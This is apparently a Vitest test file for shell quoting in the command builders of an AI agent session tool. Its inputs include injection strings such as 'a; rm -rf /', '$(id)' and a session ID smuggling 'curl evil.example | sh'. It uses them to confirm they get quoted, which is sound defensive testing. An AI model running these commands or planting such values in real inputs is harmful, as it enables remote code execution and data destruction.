import { describe, expect, it } from 'vitest';
import { applyResumeTemplate } from '../../src/agents/AgentAdapter';
import { createClaudeAdapter } from '../../src/agents/claude';
import { createPiAdapter } from '../../src/agents/pi';
import { shellQuote } from '../../src/util/shellQuote';

describe('shellQuote', () => {
  it('leaves a safe token untouched', () => {
    expect(shellQuote('abc-123')).toBe('abc-123');
    expect(shellQuote('/Users/me/code/api')).toBe('/Users/me/code/api');
  });

  it('single-quotes values with spaces', () => {
    expect(shellQuote('my session')).toBe("'my session'");
  });

  it('escapes embedded single quotes', () => {
    expect(shellQuote("it's")).toBe("'it'\\''s'");
  });

  it('single-quotes values with shell metacharacters', () => {
    for (const value of ['`id`', '$(id)', 'a; rm -rf /', 'a\nb', 'a"b']) {
      const quoted = shellQuote(value);
      expect(quoted.startsWith("'")).toBe(true);
      expect(quoted.endsWith("'")).toBe(true);
    }
  });
});

describe('command template quoting', () => {
  const record = {
    agent: 'claude',
    sessionId: 'x; curl evil.example | sh',
    cwd: '/tmp/with space',
    title: 'a`b$c',
  } as never;

  it('quotes only ${sessionId} in applyResumeTemplate', () => {
    const command = applyResumeTemplate(
      'claude --resume ${sessionId} --cwd ${cwd} --title ${title}',
      record,
    );
    expect(command).toContain("'x; curl evil.example | sh'");
    expect(command).toContain('${cwd}');
    expect(command).toContain('${title}');
  });

  it('passes --name only for plain-text titles', () => {
    const claude = createClaudeAdapter({ env: {} });
    expect(claude.buildNewCommand({ sessionId: 'ok', name: 'Plain name' })).toBe(
      "claude --session-id ok --name 'Plain name'",
    );
    // Titles with shell metacharacters are not passed to the agent.
    expect(claude.buildNewCommand({ sessionId: 'ok', name: 'a`b' })).toBe('claude --session-id ok');
    const pi = createPiAdapter({ env: {} });
    expect(pi.buildNewCommand({ sessionId: 'ok', name: 'a b' })).toBe(
      "pi --session-id ok --name 'a b'",
    );
  });
});
